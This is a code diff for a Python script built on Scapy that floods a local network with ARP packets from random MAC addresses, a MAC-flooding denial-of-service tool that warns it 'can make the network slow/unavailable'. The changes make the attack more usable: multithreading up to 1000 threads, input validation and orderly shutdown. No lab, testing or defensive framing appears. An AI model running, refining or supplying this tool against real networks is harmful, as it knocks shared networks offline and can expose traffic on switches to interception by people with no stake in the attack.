@@ -4,14 +4,13 @@ import random
 import sys
 import threading
 import os
+import time
 sys.stderr = None 
 from scapy.all import *
 sys.stderr = sys.__stderr__
 
 packetCount = 0
-
-def get_cpu_cores():
-    return os.cpu_count()
+stop_event = threading.Event()
 
 def check_root():
     if os.geteuid() != 0:
@@ -20,41 +19,63 @@ def check_root():
 
 def generateRandomMac():
     mac = ""
-    for i in range (0, 6):
-        digit = hex(random.randint(0,255))
-        digit = digit[2:]
+    for i in range(6):
+        digit = hex(random.randint(0, 255))[2:]
         if len(digit) == 1:
             digit = "0" + digit
-        mac = mac + digit +":"
+        mac += digit + ":"
     return mac[:-1]
-
 
 def sendPacket(sourceMac, destinationMac):
     global packetCount
-    sendp(Ether(src=sourceMac,dst=destinationMac) /
+    sendp(Ether(src=sourceMac, dst=destinationMac) /
           ARP(op=2, psrc="0.0.0.0", hwdst=destinationMac) /
-          Padding(load="X"*18),verbose = False)
-    packetCount = packetCount +1
+          Padding(load="X"*18), verbose=False)
+    packetCount += 1
     print("Packets: " + str(packetCount))
 
 def floodMac():
-    while True:
-        sendPacket(generateRandomMac(),generateRandomMac())
+    while not stop_event.is_set():
+        try:
+            sendPacket(generateRandomMac(), generateRandomMac())
+        except Exception as e:
+            print(f"An error occurred: {e}")
 
-def startThreads():
-    global packetCount
-    for i in range(1,threads):
-        print(str(i))
+def startThreads(threads):
+    for i in range(threads):
         t = threading.Thread(target=floodMac)
+        t.daemon = False
         t.start()
 
-if __name__ == "__main__":
+def main():
     try:
         check_root()
-        cpu_cores = get_cpu_cores()
         print("The script can make the network slow/unavailable")
         print("To stop press CTRL+C")
-        threads = int(input(f"\nEnter number of Threads (1-{cpu_cores} or more): "))
-        startThreads()
+
+        while True:
+            threads_input = input(f"\nEnter number of Threads (1-1000): ")
+            try:
+                threads = int(threads_input)
+                if threads < 1 or threads > 1000:
+                    print("Please enter a valid number of threads between 1 and 1000.")
+                else:
+                    break
+            except ValueError:
+                print("Invalid input. Please enter a number.")
+        startThreads(threads)
+        while True:
+            time.sleep(1)
+        
     except KeyboardInterrupt:
-        print("\nScript stopped by user.")
+        print("\nStopping the script...")
+        stop_event.set()
+    finally:
+        for t in threading.enumerate():
+            if t is not threading.current_thread():
+                t.join()
+        print("Script has been stopped.")
+
+
+if __name__ == "__main__":
+    main()
